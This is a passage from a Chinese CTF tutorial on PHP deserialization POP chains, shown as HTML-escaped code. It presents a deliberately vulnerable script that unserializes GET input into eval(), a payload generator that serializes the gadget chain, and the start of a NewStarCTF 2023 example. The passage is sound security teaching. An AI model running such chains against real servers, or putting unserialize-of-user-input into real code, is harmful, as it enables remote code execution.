class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;highlight_file&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Hello&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$source&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;str=&lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) // 1. &lt;span class=&#34;title&#34;&gt;destruct&lt;/span&gt;函数为&lt;span class=&#34;title&#34;&gt;pop&lt;/span&gt;链头&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;source=&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;str;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;source; &lt;span class=&#34;comment&#34;&gt;//输出变量，把类当作字符串，触发__toString&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Show&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$source&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__toString&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) // 2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt; = &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;str[&lt;span class=&#34;string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;]-&amp;gt;source; &lt;span class=&#34;comment&#34;&gt;//访问不存在的属性，触发_get&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$content&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Uwant&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$params&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;params=&lt;span class=&#34;string&#34;&gt;&amp;#x27;phpinfo();&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__get&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$key&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123; &lt;span class=&#34;comment&#34;&gt;// 3 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;getshell&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;params); &lt;span class=&#34;comment&#34;&gt;//直接调用getshell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;getshell&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$value&lt;/span&gt;&lt;/span&gt;)  // 4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;params); &lt;span class=&#34;comment&#34;&gt;//尾，输出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;a&amp;#x27;&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;//GET传参头&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;unserialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;先找链子的头和尾，头部明显是 GET 传参，尾部是 &lt;code&gt;Uwant&lt;/code&gt;  类中的 &lt;code&gt;getshell&lt;/code&gt; ，然后往上倒推， &lt;code&gt;Uwant&lt;/code&gt;  类中的 &lt;code&gt;__get()&lt;/code&gt;  中调用了 &lt;code&gt;getshell&lt;/code&gt; ， &lt;code&gt;Show&lt;/code&gt;  类中的 &lt;code&gt;toString&lt;/code&gt;  调用了 &lt;code&gt;__get()&lt;/code&gt; ，然后 &lt;code&gt;Hello&lt;/code&gt;  类中的 &lt;code&gt;__destruct()&lt;/code&gt; ，而我们 GET 传参之后会先进入 &lt;code&gt;__destruct()&lt;/code&gt; ，这样子头和尾就连上了，所以说完整的链子就是：&lt;/p&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Plaintext&#34;&gt;&lt;figure class=&#34;iseeu highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;头 -&amp;gt; Hello::__destruct() -&amp;gt; Show::__toString() -&amp;gt; Uwant::__get() -&amp;gt; Uwant::getshell -&amp;gt; 尾&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Hello&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$source&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Show&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$source&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$str&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Uwant&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$params&lt;/span&gt;=&lt;span class=&#34;string&#34;&gt;&amp;#x27;phpinfo();&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Hello&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Show&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Uwant&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; -&amp;gt; str = &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; -&amp;gt; str[&lt;span class=&#34;string&#34;&gt;&amp;#x27;str&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;h4 id=&#34;例题&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#例题&#34;&gt;#&lt;/a&gt; 例题&lt;/h4&gt;
&lt;h5 id=&#34;newstarctf-2023-week3-pop-gadget&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#newstarctf-2023-week3-pop-gadget&#34;&gt;#&lt;/a&gt; newstarctf 2023 week3 | POP Gadget&lt;/h5&gt;
&lt;div class=&#34;highlight-container&#34; data-rel=&#34;Php&#34;&gt;&lt;figure class=&#34;iseeu highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Begin&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$name&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__destruct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) //对象被销毁时触发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;/[a-zA-Z0-9]/&amp;quot;&lt;/span&gt;,&lt;span class=&#34;variable&#34;&gt;$this&lt;/span&gt;-&amp;gt;name))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;//将对象当作字符串，可以触发__toString&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome to NewStarCTF 2023!&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;Then&lt;/span&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$func&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span 